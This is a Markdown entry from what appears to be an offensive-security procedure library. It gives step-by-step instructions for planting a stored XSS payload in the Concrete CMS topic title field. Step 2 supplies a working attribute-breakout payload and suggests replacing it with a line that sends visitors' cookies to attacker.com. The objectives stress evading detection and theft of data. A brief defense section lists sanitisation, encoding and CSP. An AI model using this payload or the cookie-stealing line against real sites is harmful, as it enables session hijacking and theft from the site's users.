---
id: proc-uuid-1
tags:
  - xss
  - stored-xss
  - injection
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.561Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Topic-Title

## Summary

This procedure exploits insufficient input validation in the Concrete CMS topic title field to inject a stored XSS payload, which is persisted in the backend and rendered unsafely for subsequent users.

## Description

In Concrete CMS, the topic list title field fails to sanitize user input, allowing attackers to inject HTML and JavaScript that closes existing attributes and executes on page render. This stored variant affects all viewers of the topic list, potentially leading to session hijacking, phishing, or defacement. The attack requires authenticated access to create a topic but impacts both authenticated and unauthenticated users based on visibility settings. Prerequisites include a running Concrete CMS instance with topic functionality.

## Requirements

1. Authenticated user account with permissions to create topics
2. Web browser for form submission
3. Access to the Concrete CMS dashboard or topic management interface

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization on title fields using libraries like HTMLPurifier
- Apply context-aware output encoding (e.g., htmlspecialchars for HTML contexts) when rendering titles
- Deploy Content Security Policy (CSP) to block inline script execution
- Monitor for anomalous JavaScript payloads in logs or database queries

## Objectives

1. Store malicious JavaScript in the topic title without detection
2. Set up persistent execution for topic list viewers
3. Enable secondary impacts like data theft via executed code

## Instructions

### Step 1: Access Topic Creation

**Context**: Log in to Concrete CMS and navigate to the section for creating or editing topics to access the vulnerable title field.

Go to the topic management area (typically under Dashboard > Topics > Add Topic) and locate the title input field.

### Step 2: Craft and Submit Payload

**Context**: Enter a payload that breaks out of the HTML attribute context and injects an executable script tag or event handler.

Use the following payload in the title field:

```
'><img src=x onerror=alert(1)>
```

Submit the form to create the topic. This closes the surrounding quote, injects an img tag with an onerror handler, and stores the payload server-side.

> The payload executes alert(1) when the broken image src fails to load, confirming XSS. In a real attack, replace with malicious code like document.location='http://attacker.com/steal?cookie='+document.cookie.

**Expected Output**: Topic created successfully; title may appear garbled in the creator's view but is stored intact.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[concrete-cms]]
